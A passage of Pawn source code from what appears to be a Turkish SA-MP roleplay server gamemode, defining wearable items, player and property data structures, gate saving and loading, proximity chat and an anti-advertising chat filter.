{18932,100,"Þapka7"},
{18933,100,"Þapka8"},
{18934,100,"Þapka9"},
{18935,100,"Þapka10"},
{18936,50,"Kask1"},
{18937,75,"Kask2"},
{18938,100,"Kask3"},
{18939,75,"Ters Þapka1"},
{18940,75,"Ters Þapka2"},
{18941,75,"Ters Þapka3"},
{18942,100,"Ters Þapka4"},
{18943,100,"Ters Þapka5"},
{18944,100,"Hasýr Þapka1"},
{18945,125,"Hasýr Þapka2"},
{18946,150,"Hasýr Þapka3"},
{18947,100,"Fötr Þapka1"},
{18948,100,"Fötr Þapka2"},
{18949,100,"Fötr Þapka3"},
{18950,100,"Fötr Þapka4"},
{18951,100,"Fötr Þapka5"},
{18952,150,"Boks Kaský"},
{18953,50,"Örme Þapka1"},
{18954,75,"Örme Þapka2"},
{18955,75,"Hippi Þapkasý1"},
{18956,75,"Hippi Þapkasý2"},
{18957,75,"Hippi Þapkasý3"},
{18958,75,"Hippi Þapkasý4"},
{18959,75,"Hippi Þapkasý5"},
{18960,100,"Kep Þapka1"},
{18961,75,"Kamyoncu Þapkasý1"},
{18962,75,"Kovboy Þapkasý2"},
{18964,100,"Kurukafa Bere1"},
{18965,125,"Kurukafa Bere2"},
{18966,150,"Kurukafa Bere3"},
{18967,100,"Erkek Þapkasý1"},
{18968,100,"Erkek Þapkasý2"},
{18969,100,"Erkek Þapkasý3"},
{18970,200,"Kaplan Þapka"},
{18971,100,"Cool Þapka1"},
{18972,125,"Cool Þapka2"},
{18973,150,"Cool Þapka3"},
{18974,1000,"Zorro Maskesi1"},
{18645,150,"Motorcu Kaský"},
{18976,100,"Motorcu Kaský2"},
{18977,100,"Motorcu Kaský3"},
{18978,125,"Motorcu Kaský4"},
{18979,150,"Motorcu Kaský5"},
{19006,50,"Gözlük1"},
{19007,50,"Gözlük2"},
{19008,50,"Gözlük3"},
{19009,50,"Gözlük4"},
{19010,50,"Gözlük5"},
{19011,50,"Gözlük6"},
{19012,50,"Gözlük7"},
{19013,50,"Gözlük8"},
{19014,50,"Gözlük9"},
{19015,50,"Gözlük10"},
{19016,100,"Gözlük11"},
{19017,100,"Gözlük12"},
{19018,100,"Gözlük13"},
{19019,100,"Gözlük14"},
{19020,100,"Gözlük15"},
{19021,100,"Gözlük16"},
{19022,100,"Gözlük17"},
{19023,100,"Gözlük18"},
{19024,100,"Gözlük19"},
{19025,100,"Gözlük20"},
{19026,150,"Gözlük21"},
{19027,150,"Gözlük22"},
{19028,150,"Gözlük23"},
{19029,150,"Gözlük24"},
{19030,150,"Gözlük25"},
{19031,150,"Gözlük26"},
{19032,150,"Gözlük27"},
{19033,150,"Gözlük28"},
{19034,150,"Gözlük29"},
{19035,150,"Gözlük30"},
{19036,200,"Hokey Maskesi1"},
{19037,200,"Hokey Maskesi2"},
{19038,200,"Hokey Maskesi3"},
{19039,50,"Saat1"},
{19040,50,"Saat2"},
{19041,50,"Saat3"},
{19042,50,"Saat4"},
{19043,50,"Saat5"},
{19044,50,"Saat6"},
{19045,50,"Saat7"},
{19046,100,"Saat8"},
{19047,100,"Saat9"},
{19048,100,"Saat10"},
{19049,100,"Saat11"},
{19050,100,"Saat12"},
{19051,100,"Saat13"},
{19052,100,"Saat14"},
{19053,100,"Saat15"},
{19064,1000, "Noel Þapkasý1"},
{19065,2000, "Noel Þapkasý2"},
{19066,300, "Noel Þapkasý3"},
{19067,100, "Kapþon1"},
{19068,100, "Kapþon2"},
{19069,100, "Kapþon3"},
{19078,750, "Papaðan1"},
{19079,750, "Papaðan2"},
{19085,500, "Korsan Bandý"},
{19090,150, "Mavi Ponpon"},
{19091,150, "Kýrmýzý Ponpon"},
{19092,150, "Yeþil Ponpon"},
{19094,200, "Hamburger Þapkasý"},
{19095,50, "Kovboy Þapkasý1"},
{19096,50, "Kovboy Þapkasý3"},
{19097,100, "Kovboy Þapkasý4"},
{19098,100, "Kovboy Þapkasý5"},
{19101,200, "Ordu Kaský1"},
{19102,200, "Ordu Kaský2"},
{19103,200, "Ordu Kaský3"},
{19104,200, "Ordu Kaský4"},
{19105,200, "Ordu Kaský5"},
{19106,200, "Ordu Kaský6"},
{19107,400, "Ordu Kaský7"},
{19108,400, "Ordu Kaský8"},
{19109,400, "Ordu Kaský9"},
{19110,400, "Ordu Kaský10"},
{19111,400, "Ordu Kaský11"},
{19112,400, "Ordu Kaský12"},
{19113,100, "Komik Kask1"},
{19114,200, "Komik Kask2"},
{19115,300, "Komik Kask3"},
{19116,50, "Düz Kask1"},
{19117,50, "Düz Kask2"},
{19118,75, "Düz Kask3"},
{19119,100, "Düz Kask4"},
{19120,100, "Düz Kask5"},
{19137,500, "Tavukçu Þapkasý"},
{19163,100, "Siyah Maske"},
{1210,50, "Evrak Çantasý"},
{19421,50, "Kulaklýk1"},
{19422,50, "Kulaklýk2"},
{19423,50, "Kulaklýk3"},
{19424,50, "Kulaklýk4"},
{19350,50, "Býyýk1"},
{19351,50, "Býyýk2"},
{19352,50, "Fötr"},
{19349,50, "Tekli Gözlük"},
{19317,50, "Bass gitar"},
{371,500, "Backpack"},
{3044,500, "Sigara"},
{3027,500, "Sarma Sigara"}
};

new HoldingBones[][] = {
	"Yok",
	"Omurga",
	"Kafa",
	"Sol üst kol",
	"Sað üst kol",
	"Sol el",
	"Sað el",
	"Sol uyluk",
	"Sað uyluk",
	"Sol ayak",
	"Sað ayak",
	"Sað baldýr",
	"Sol baldýr",
	"Sol ön kol",
	"Sað ön kol",
	"Sol köprücük kemiði",
	"Sað köprücük kemiði",
	"Boyun",
	"Çene"
};

enum pInfo
{
	pKey[129],
	pLevel,
	pAdmin,
	pAdminName[32],
	pBanAppealer,
	pGangMod,
	pDonator,
	pBanned,
	pPermaBanned,
	pDisabled,
	pIP[16],
	pReg,
	pID,
 	pTut,
	pSex,
	pAge,
	pSkin,
	Float:pPos_x,
	Float:pPos_y,
	Float:pPos_z,
	Float:pPos_r,
	pConnectTime,
	pRespect,
	pNumber,
	pWarns,
	pGang,
	pFaction,
	pLeader,
	pRank,
	pJob,
	pJob2,
	gPupgrade,
	Float:pSarmor,
	pCash,
	pBank,
	pInsurance,
	pCrimes,
	pArrested,
	pWantedLevel,
	Float:pHealth,
	Float:pArmor,
	pPot,
	pCrack,
	pPackages,
	pCrates,
	pRadio,
	pRadioFreq,
	pPhoneBook,
	pDice,
	pCDPlayer,
	pMats,
	pRope,
	pCigar,
	pSprunk,
	pSpraycan,
	pHouse,
	pHouse2,
	pRenting,
	pInt,
	pVW,
	pJailed,
	pJailTime,
	pGuns[12],
	pAGuns[12],
	pPayCheck,
	pPayReady,
	pHospital,
	pDetSkill,
	pLawSkill,
	pSexSkill,
	pDrugsSkill,
	pSmugSkill,
	pArmsSkill,
	pMechSkill,
	pFishSkill,
	pBoxSkill,
	pTruckSkill,
	pCarSkill,
	//pCraftSkill,
	pLawyerTime,
	pLawyerFreeTime,
	pDrugsTime,
	pMechTime,
	pSexTime,
	pCarTime,
	pFishes,
	pBiggestFish,
	pLockCar, // non-saved
	pWeedObject,
	Float: pWeedPos[3],
	pWeedVW,
	pWeedInt,
	pWeedGrowth,
	pWSeeds,
	pWins,
	pLoses,
	pFightStyle,
	pScrewdriver,
	pSmslog,
	pWristwatch,
	pTire,
	pFirstaid,
	pRccam,
	pReceiver,
	pGPS,
	pSweep,
	pSweepLeft,
	pBugged,
	pVehicleKeys,
	pVehicleKeysFrom,
	pDuty,
	pCarLic,
	pFlyLic,
	pBoatLic,
	pFishLic,
	pGunLic,
	pDivision,
	pLiveBanned,
	pTicketTime,
	pHeadValue,
	pContractBy[32],
	pContractDetail[64],
	pC4,
	pC4Get,
	pC4Used,
	pBombs,
	pCHits,
	pFHits,
	pPrisonedBy[MAX_PLAYER_NAME],
	pPrisonReason[128],
	pAcceptReport,
	pTrashReport,
	pAccent,
	pNMute,
	pNMuteTotal,
	pADMute,
	pADMuteTotal,
	pRMuted,
	pRMutedTotal,
	pRMutedTime,
	pSpeedo,
	pGCMuted,
	pGCMutedTime,
	pCallsAccepted,
	pHelper,
	pPatientsDelivered,
	pTriageTime,
	pMarried,
	pMarriedTo[MAX_PLAYER_NAME],
	pKillLog0[128],
	pKillLog1[128],
	pKillLog2[128],
	pKillLog3[128],
	pKillLog4[128],
	pKillLog5[128],
	pKillLog6[128],
	pKillLog7[128],
	pKillLog8[128],
	pKillLog9[128],
	pFlag[128],
	pReferredBy[MAX_PLAYER_NAME],
	pRefTokens,
	pRefTokensOffline,
	pWalkStyle,
	pGate1,
	pGate2,
	pGate3,
	pBlindfold,
	pGas,
	pBiz,
    pVBiz,
	pEmlak,
	pmka,
	eDuzenliyor,
	
	pPet,
    pPetAdi[32],
    pPetCani,
    pPetKontrol,
    pPetTuru,
    /*Float:PetPosX,
    Float:PetPosY,
    Float:PetPosZ,
    Float:PetPosA,*/
    pTagAktif,
    pOyuncuAdi[MAX_PLAYER_NAME],
    pBParaKayit,
    pOParaKayit,
    pAracAnahtari
};

new RandomMessages[][] =
{
    "Bilgi: ~w~Plaka almazsaniz ceza yiyebilirsiniz.",
    "Bilgi: ~w~TS Adresimiz : ts.phoenix-roleplay.xyz",
    "Bilgi: ~w~Sitemiz : www.phoenix-gaming.xyz",
    "Bilgi: ~w~OOC Market icin adminlere rapor atabilirsiniz !",
    "Bilgi: ~w~Hile kullanmak ban sebebidir ve asla temyizi olmaz !",
    "Bilgi: ~w~Olusumlara katilmak icin Forumumuza basvurunuz.",
   	"Bilgi: ~w~Kiralik arac almak icin /arackirala komutunu kullaniniz",
    "Bilgi: ~w~Interiorlara girmek icin Y tusunu kullanabilirsiniz",
    "Bilgi: ~w~Serverde haftada 1 kez etkinlik olmaktadir.",
    "Bilgi: ~w~Sunucumuzda baslangic hediyesi asla verilmemektedir !"
};
	
new PlayerInfo[MAX_PLAYERS + 1][pInfo];

/*enum mdInfo
{
	mdID,
	mdModel,
	mdFaction,
	Float: mdPosX,
	Float: mdPosY,
	Float: mdPosZ,
	Float: mdRotX,
	Float: mdRotY,
	Float: mdRotZ,
	Float: mdPosMX,
	Float: mdPosMY,
	Float: mdPosMZ,
	Float: mdRotMX,
	Float: mdRotMY,
	Float: mdRotMZ
	mdInt,
	mdVW
};

enum Engel
{
	bVar,
	Float: bX,
	Float: bY,
	Float: bZ,
	bModel,
	Sahip,
	bObje,
	bText[80],
	Text3D: b3D
}
enum Engel
{
	bVar,
	Float: bX,
	Float: bY,
	Float: bZ,
	bModel,
	Sahip,
	bObje,
	bText[80],
	Text3D: b3D
}
new EngelInfo[MAX_ENGEL][Engel];
new MDI[MAX_MDS][mdInfo];*/

new Engel[MAX_ENGEL];
enum pvInfo
{
    Float:pvPosX,
	Float:pvPosY,
	Float:pvPosZ,
 	Float:pvPosAngle,
	pvId,
	pvRealID,
	pvModelId,
	pvLock,
	pvLocked,
	pvPaintJob,
	pvColor1,
	pvColor2,
	pvMods[MAX_MODS],
	pvAllowedplayerid,
	pvPark,
	pvNumberPlate[32],
	pvPrice,
	pvTicket,
	pvWeapons[3],
	pvWepUpgrade,
	pvImpounded,
	pvSpawned,
	pvDisabled,
	Float: pvFuel,
};
new PlayerVehicleInfo[MAX_PLAYERS+1][MAX_PLAYERVEHICLES][pvInfo];

enum ptInfo
{
    ptModelID,
    ptRealID,
	ptBone,
    Float:ptPosX,
	Float:ptPosY,
	Float:ptPosZ,
	Float:ptRotX,
	Float:ptRotY,
	Float:ptRotZ,
	Float:ptScaleX,
	Float:ptScaleY,
	Float:ptScaleZ,
};
new PlayerToyInfo[MAX_PLAYERS+1][MAX_PLAYERTOYS][ptInfo];

enum hInfo
{
	hOwned,
	hLevel,
	hHInteriorWorld,
	hCustomInterior,
	hDescription[8],
	hOwner[MAX_PLAYER_NAME],
	Float: hExteriorX,
	Float: hExteriorY,
	Float: hExteriorZ,
	Float: hExteriorR,
	Float: hInteriorX,
	Float: hInteriorY,
	Float: hInteriorZ,
	Float: hInteriorR,
	hLock,
	hRentable,
	hRentFee,
	hValue,
	hSafeMoney,
	hPot,
	hCrack,
	hMaterials,
	hWeapons[5],
	hGLUpgrade,
	hPickupID,
	Text3D: hTextID,
	hCustomExterior
};

new HouseInfo[MAX_HOUSES][hInfo];

enum dmpInfo
{
	dmpMapIconID,
	Float: dmpPosX,
	Float: dmpPosY,
	Float: dmpPosZ,
	dmpMarkerType,
	dmpColor,
	dmpVW,
	dmpInt,
}
new DMPInfo[MAX_DMAPICONS][dmpInfo];

enum ddInfo
{
	ddDescription[128],
	ddPickupID,
	Text3D: ddTextID,
	ddCustomInterior,
	ddExteriorVW,
	ddExteriorInt,
	ddInteriorVW,
	ddInteriorInt,
	Float: ddExteriorX,
	Float: ddExteriorY,
	Float: ddExteriorZ,
	Float: ddExteriorA,
	Float: ddInteriorX,
	Float: ddInteriorY,
	Float: ddInteriorZ,
	Float: ddInteriorA,
	ddCustomExterior,
	ddVIP,
	ddGang,
	ddFaction,
	ddAdmin,
	ddWanted,
	ddVehicleAble,
	ddColor,
	ddPickupModel,
	ddPass[24],
	ddLocked,
	ddNotEditable,
};
new DDoorsInfo[MAX_DDOORS][ddInfo];

enum bbInfo
{
    Float:bbPosX,
	Float:bbPosY,
	Float:bbPosZ,
	bbInt,
	bbVW,
	bbStation,
	bbSetBy,
	bbObject,
};
new BoomboxInfo[MAX_PLAYERS][bbInfo];

new OneSeatVehicles[38] =
{
    425, 430, 432, 441, 446, 448, 452, 453,
	454, 464, 465, 472, 473, 476, 481, 484,
	485, 486, 493, 501, 509, 510, 519, 520,
	530, 531, 532, 539, 553, 564, 568, 571,
	572, 574, 583, 592, 594, 595
};

stock FishCost(playerid, fish)
{
	if(IsPlayerConnected(playerid)) {
		new cost = 0;
		switch (fish)
		{
			case 1:
			{
				cost = 1;
			}
			case 2:
			{
				cost = 1;
			}
			case 3:
			{
				cost = 1;
			}
			case 5:
			{
				cost = 5;
			}
			case 6:
			{
				cost = 2;
			}
			case 8:
			{
				cost = 8;
			}
			case 9:
			{
				cost = 12;
			}
			case 11:
			{
				cost = 9;
			}
			case 12:
			{
				cost = 7;
			}
			case 14:
			{
				cost = 12;
			}
			case 15:
			{
				cost = 9;
			}
			case 16:
			{
				cost = 7;
			}
			case 17:
			{
				cost = 7;
			}
			case 18:
			{
				cost = 10;
			}
			case 19:
			{
				cost = 4;
			}
			case 21:
			{
				cost = 3;
			}
		}
		return cost;
	}
	return 0;
}
stock ClearFishes(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		Fishes[playerid][pFid1] = 0; Fishes[playerid][pFid2] = 0; Fishes[playerid][pFid3] = 0;
		Fishes[playerid][pFid4] = 0; Fishes[playerid][pFid5] = 0;
		Fishes[playerid][pWeight1] = 0; Fishes[playerid][pWeight2] = 0; Fishes[playerid][pWeight3] = 0;
		Fishes[playerid][pWeight4] = 0; Fishes[playerid][pWeight5] = 0;

		new string[MAX_PLAYER_NAME];
		format(string, sizeof(string), "Yok");
		strmid(Fishes[playerid][pFish1], string, 0, strlen(string), 255);
		strmid(Fishes[playerid][pFish2], string, 0, strlen(string), 255);
		strmid(Fishes[playerid][pFish3], string, 0, strlen(string), 255);
		strmid(Fishes[playerid][pFish4], string, 0, strlen(string), 255);
		strmid(Fishes[playerid][pFish5], string, 0, strlen(string), 255);
	}
	return 1;
}

stock ClearFishID(playerid, fish)
{
	if(IsPlayerConnected(playerid))
	{
		new string[MAX_PLAYER_NAME];
		format(string, sizeof(string), "Yok");
		switch (fish)
		{
			case 1:
			{
				strmid(Fishes[playerid][pFish1], string, 0, strlen(string), 255);
				Fishes[playerid][pWeight1] = 0;
				Fishes[playerid][pFid1] = 0;
			}
			case 2:
			{
				strmid(Fishes[playerid][pFish2], string, 0, strlen(string), 255);
				Fishes[playerid][pWeight2] = 0;
				Fishes[playerid][pFid2] = 0;
			}
			case 3:
			{
				strmid(Fishes[playerid][pFish3], string, 0, strlen(string), 255);
				Fishes[playerid][pWeight3] = 0;
				Fishes[playerid][pFid3] = 0;
			}
			case 4:
			{
				strmid(Fishes[playerid][pFish4], string, 0, strlen(string), 255);
				Fishes[playerid][pWeight4] = 0;
				Fishes[playerid][pFid4] = 0;
			}
			case 5:
			{
				strmid(Fishes[playerid][pFish5], string, 0, strlen(string), 255);
				Fishes[playerid][pWeight5] = 0;
				Fishes[playerid][pFid5] = 0;
			}
		}
	}
	return 1;
}

public OnPlayerEditDynamicObject(playerid, objectid, response, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz)
{
	new string[128], idx = gEditID[playerid];
	if(gEdit[playerid] == 2)
	{
	 	if(response == EDIT_RESPONSE_UPDATE)
		{
		    SetDynamicObjectPos(objectid, x, y, z);
			SetDynamicObjectRot(objectid, rx, ry, rz);
		}
		else if(response == EDIT_RESPONSE_CANCEL)
		{
			SetDynamicObjectPos(objectid, gPos[playerid][0], gPos[playerid][1], gPos[playerid][2]);
			SetDynamicObjectRot(objectid, gRot[playerid][0], gRot[playerid][1], gRot[playerid][2]);
			gPos[playerid][0] = 0; gPos[playerid][1] = 0; gPos[playerid][2] = 0;
			gRot[playerid][0] = 0; gRot[playerid][1] = 0; gRot[playerid][2] = 0;
			format(string, sizeof(string), "%d ID'li gateyi düzenlemekten vazgeçtin!", idx);
			SendClientMessage(playerid, COLOR_WHITE,string);
			gEdit[playerid] = 0;
			gEditID[playerid] = 0;
		}
		else if(response == EDIT_RESPONSE_FINAL)
		{
			SetDynamicObjectPos(objectid, x, y, z);
			SetDynamicObjectRot(objectid, rx, ry, rz);
		    GateInfo[idx][gOX] = x;
			GateInfo[idx][gOY] = y;
			GateInfo[idx][gOZ] = z;
			GateInfo[idx][gORX] = rx;
			GateInfo[idx][gORY] = ry;
			GateInfo[idx][gORZ] = rz;
			gEdit[playerid] = 0;
			gEditID[playerid] = 0;
			format(string, sizeof(string), "%d ID'li gatenin kapanma pozisyonunu ayarladýn!", idx);
		    SendClientMessage(playerid, COLOR_WHITE,string);
		    SaveGates();
		    GateInfo[idx][gStatus] = 1;
		}
	}
	if(gEdit[playerid] == 1)
	{
	 	if(response == EDIT_RESPONSE_UPDATE)
		{
		    SetDynamicObjectPos(objectid, x, y, z);
			SetDynamicObjectRot(objectid, rx, ry, rz);
		}
		else if(response == EDIT_RESPONSE_CANCEL)
		{
			SetDynamicObjectPos(objectid, gPos[playerid][0], gPos[playerid][1], gPos[playerid][2]);
			SetDynamicObjectRot(objectid, gRot[playerid][0], gRot[playerid][1], gRot[playerid][2]);
			gPos[playerid][0] = 0; gPos[playerid][1] = 0; gPos[playerid][2] = 0;
			gRot[playerid][0] = 0; gRot[playerid][1] = 0; gRot[playerid][2] = 0;
			format(string, sizeof(string), "%d ID'li gateyi düzenlemekten vazgeçtin!", idx);
			SendClientMessage(playerid, COLOR_WHITE,string);
			gEdit[playerid] = 0;
			gEditID[playerid] = 0;
		}
		else if(response == EDIT_RESPONSE_FINAL)
		{
			SetDynamicObjectPos(objectid, x, y, z);
			SetDynamicObjectRot(objectid, rx, ry, rz);
		    GateInfo[idx][gCX] = x;
			GateInfo[idx][gCY] = y;
			GateInfo[idx][gCZ] = z;
			GateInfo[idx][gCRX] = rx;
			GateInfo[idx][gCRY] = ry;
			GateInfo[idx][gCRZ] = rz;
			if(IsValidDynamic3DTextLabel(GateInfo[idx][gText])) DestroyDynamic3DTextLabel(GateInfo[idx][gText]);
			format(string, sizeof(string), "Gate ID: %d", idx);
			GateInfo[idx][gText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ], 10);
		    gEdit[playerid] = 0;
		    gEditID[playerid] = 0;
		    format(string, sizeof(string), "%d ID'li gatenin açýlma pozisyonunu ayarladýn!", idx);
		    SendClientMessage(playerid, COLOR_WHITE,string);
		    SaveGates();
		    GateInfo[idx][gStatus] = 0;
		}
	}
	return 1;
}

stock LoadGates()
{
	new dinfo[15][128];
	new string[256];
	new File:file = fopen("gates.cfg", io_read);
	if(file)
	{
	    new idx = 1;
		while(idx < MAX_GATES)
		{
		    fread(file, string);
		    split(string, dinfo, '|');
            GateInfo[idx][gModel] = strval(dinfo[0]);
			GateInfo[idx][gCX] = floatstr(dinfo[1]);
			GateInfo[idx][gCY] = floatstr(dinfo[2]);
			GateInfo[idx][gCZ] = floatstr(dinfo[3]);
			GateInfo[idx][gCRX] = floatstr(dinfo[4]);
			GateInfo[idx][gCRY] = floatstr(dinfo[5]);
			GateInfo[idx][gCRZ] = floatstr(dinfo[6]);
			GateInfo[idx][gOX] = floatstr(dinfo[7]);
			GateInfo[idx][gOY] = floatstr(dinfo[8]);
			GateInfo[idx][gOZ] = floatstr(dinfo[9]);
			GateInfo[idx][gORX] = floatstr(dinfo[10]);
			GateInfo[idx][gORY] = floatstr(dinfo[11]);
			GateInfo[idx][gORZ] = floatstr(dinfo[12]);
			format(GateInfo[idx][gPassword], 256, "%s", dinfo[13]);
			GateInfo[idx][gSpeed] = floatstr(dinfo[14]);
			if(GateInfo[idx][gModel]) // If gate exists
			{
			    format(string, sizeof(string), "Gate ID: %d", idx);
				GateInfo[idx][gGate] = CreateDynamicObject(GateInfo[idx][gModel], GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ], GateInfo[idx][gCRX], GateInfo[idx][gCRY], GateInfo[idx][gCRZ]);
				GateInfo[idx][gText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ], 10);
				GateInfo[idx][gStatus] = 0;
			}
			idx++;
	    }
	}
}
stock IsPlayerNearPlayer(playerid, targetid, Float:radius)
{
	static
		Float:fX,
		Float:fY,
		Float:fZ;

	GetPlayerPos(targetid, fX, fY, fZ);

	return (GetPlayerInterior(playerid) == GetPlayerInterior(targetid) && GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(targetid)) && IsPlayerInRangeOfPoint(playerid, radius, fX, fY, fZ);
}
stock UzunEmoteMesaj(playerid, Float:radius, color, const str[], {Float,_}:...)
{
	static
	    args,
	    start,
	    end,
	    string[144]
	;
	#emit LOAD.S.pri 8
	#emit STOR.pri args

	if (args > 16)
	{
		#emit ADDR.pri str
		#emit STOR.pri start

	    for (end = start + (args - 16); end > start; end -= 4)
		{
	        #emit LREF.pri end
	        #emit PUSH.pri
		}
		#emit PUSH.S str
		#emit PUSH.C 144
		#emit PUSH.C string

		#emit LOAD.S.pri 8
		#emit CONST.alt 4
		#emit SUB
		#emit PUSH.pri

		#emit SYSREQ.C format
		#emit LCTRL 5
		#emit SCTRL 4

        foreach (new i : Player)
		{
			if (IsPlayerNearPlayer(i, playerid, radius)) {
  				SendClientMessage(i, color, string);
			}
		}
		return 1;
	}
    foreach (new i : Player)
	{
		if (IsPlayerNearPlayer(i, playerid, radius)) {
			SendClientMessage(i, color, str);
		}
	}
	return 1;
}
stock SaveGates()
{
	new idx = 1, File:file;
	new string[256];
	while(idx < MAX_GATES)
	{
	    format(string, sizeof(string), "%d|%f|%f|%f|%f|%f|%f|%f|%f|%f|%f|%f|%f|%s|%f\r\n",
		GateInfo[idx][gModel],
		GateInfo[idx][gCX],
		GateInfo[idx][gCY],
		GateInfo[idx][gCZ],
		GateInfo[idx][gCRX],
		GateInfo[idx][gCRY],
		GateInfo[idx][gCRZ],
		GateInfo[idx][gOX],
		GateInfo[idx][gOY],
		GateInfo[idx][gOZ],
		GateInfo[idx][gORX],
		GateInfo[idx][gORY],
		GateInfo[idx][gORZ],
		GateInfo[idx][gPassword],
		GateInfo[idx][gSpeed]);
		GateInfo[idx][gStatus] = 0;
	    if(idx == 1)
	    {
	        file = fopen("gates.cfg", io_write);
	    }
	    else
	    {
	    	file = fopen("gates.cfg", io_append);
	    }
		fwrite(file, string);
		fclose(file);
		idx++;
	}
	return 1;
}
forward KullanimMesajiGonder(playerid, message[]);
public KullanimMesajiGonder(playerid, message[])
{
    new KullanimYazi[256];
	format(KullanimYazi, sizeof(KullanimYazi),"{99FF33}[»]: {FFFFFF}%s", message);
    SendClientMessage(playerid, -1, KullanimYazi);
    return 1;
}
forward ProxDetector5(Float:radi, playerid, string[],string2[],col1,col2,col3,col4,col5);
public ProxDetector5(Float:radi, playerid, string[],string2[],col1,col2,col3,col4,col5)
{
	if(IsPlayerConnected(playerid))
	{
		new ProxString[512];
		new Float:posx, Float:posy, Float:posz;
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i))
			{
				if(!BigEar[i])
				{
					GetPlayerPos(i, posx, posy, posz);
					tempposx = (oldposx -posx);
					tempposy = (oldposy -posy);
					tempposz = (oldposz -posz);
					format(ProxString, sizeof(ProxString), "%s%s%s", string, GetPlayerNameEx(playerid), string2);
					if (((tempposx < radi/16) && (tempposx > -radi/16)) && ((tempposy < radi/16) && (tempposy > -radi/16)) && ((tempposz < radi/16) && (tempposz > -radi/16)))
					{
					    if(GetPlayerVirtualWorld(i) == GetPlayerVirtualWorld(playerid))
					    {
							SendClientMessage(i, col1, ProxString);
						}
					}
					else if (((tempposx < radi/8) && (tempposx > -radi/8)) && ((tempposy < radi/8) && (tempposy > -radi/8)) && ((tempposz < radi/8) && (tempposz > -radi/8)))
					{
                        if(GetPlayerVirtualWorld(i) == GetPlayerVirtualWorld(playerid))
                        {
							SendClientMessage(i, col2, ProxString);
						}
					}
					else if (((tempposx < radi/4) && (tempposx > -radi/4)) && ((tempposy < radi/4) && (tempposy > -radi/4)) && ((tempposz < radi/4) && (tempposz > -radi/4)))
					{
					    if(GetPlayerVirtualWorld(i) == GetPlayerVirtualWorld(playerid))
					    {
							SendClientMessage(i, col3, ProxString);
						}
					}
					else if (((tempposx < radi/2) && (tempposx > -radi/2)) && ((tempposy < radi/2) && (tempposy > -radi/2)) && ((tempposz < radi/2) && (tempposz > -radi/2)))
					{
					    if(GetPlayerVirtualWorld(i) == GetPlayerVirtualWorld(playerid))
					    {
							SendClientMessage(i, col4, ProxString);
						}
					}
					else if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
					{
                        if(GetPlayerVirtualWorld(i) == GetPlayerVirtualWorld(playerid))
                        {
							SendClientMessage(i, col5, ProxString);
						}
					}
    			}
				else
				{
					SendClientMessage(i, col1, ProxString);
				}
			}
		}
	}
	return 1;
}

forward EmoteMe(playerid,Float:radius,message[]);
public EmoteMe(playerid,Float:radius,message[])
{
	new string[128];
	new string2[128];
    format(string, sizeof(string), "* ");
	format(string2, sizeof(string2), " %s", message);
	ProxDetector5(15.0, playerid, string,string2,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
}

forward PlayerToPoint(Float:radi, playerid, Float:x, Float:y, Float:z);
public PlayerToPoint(Float:radi, playerid, Float:x, Float:y, Float:z)
{
    if(IsPlayerConnected(playerid))
	{
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		tempposx = (oldposx -x);
		tempposy = (oldposy -y);
		tempposz = (oldposz -z);
		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
		{
			return 1;
		}
	}
	return 0;
}

forward	ShutUp(slot);
public ShutUp(slot)
{
	switch(slot)
	{
		case 11:
		{
		SetDynamicObjectRot(Giseler[0],0.00000, 90.00000, 84.93570);
		}
		case 12:
		{
		SetDynamicObjectRot(Giseler[1],0.00000, -90.00000, 86.76000);
		}
		case 13:
		{
		SetDynamicObjectRot(Giseler[2],0.00000, 91.00000, 126.00000);
		}
		case 14:
		{
		SetDynamicObjectRot(Giseler[3],0.00000, 90.00000, 129.67500);
		}
		case 15:
		{
		SetDynamicObjectRot(Giseler[4],0.00000, 90.00000, 341.32001);
		}
		case 16:
		{
		SetDynamicObjectRot(Giseler[5],0.00000, 91.00000, 341.17999);
		}
	}
	return 1;
}
stock AntiAdv(playerid, text[])
{
    // Anti Adv
    new strR[255], is1=0, r=0;
 	while(strlen(text[is1]))
 	{
  		if('0'<=text[is1]<='9')
  		{
	 		new is2=is1+1, p=0;
	   		while(p==0)
		  	{
		   		if('0'<=text[is2]<='9'&&strlen(text[is2]))
			   	{
				   is2++;
				}
			 	else
			  	{
				   	strmid(strR[r],text,is1,is2,255);
				   	if(strval(strR[r])<255) r++;
				    is1=is2;
				    p=1;
		    	}
		    }
	    }
    	is1++;
 	}
  	if(r>=3)
 	{
		if(strfind(text, ":", true) != -1)
		if(strfind(text, ".", true) != -1)
		if(strfind(text, "|", true) != -1)
 	    {
	  		new strMy[255];
	  		format(strMy, sizeof(strMy), "AdmUyari: %s is attempting to Server Advertise: %s", RPN(playerid), text);
			SendClientMessage(playerid, COLOR_YELLOW, "Server IP'sine benzer içerik bulunduðu için mesajýnýzý yollayamýyoruz.");
			SendAdminMessage(COLOR_RED, 1, strMy);
            new pr2;
	  		for(new z=0;z<r;z++)
	  		{

		   		while((pr2=strfind(text,strR[z],true))!=-1)
				{
					for(new i=pr2,j=pr2+strlen(strR[z]);i<j;i++)
					{
						text[i]='*';
					}
				}
	  		}
	  		return 1;
 		}
	}
	return 0;
}

stock CrearFotoMulta(Float:fx,Float:fy,Float:fz,Float:frx,Float:fry,Float:frz,Float:fradio,fvelmax)
{
    new r, string[128];
	for(r=0; r < MAX_RADAR; r++)
	if(!RadarInfo[r][rCreado]) break;
	CreateDynamicObject(18880,fx,fy,fz-1,frx,fry,frz);
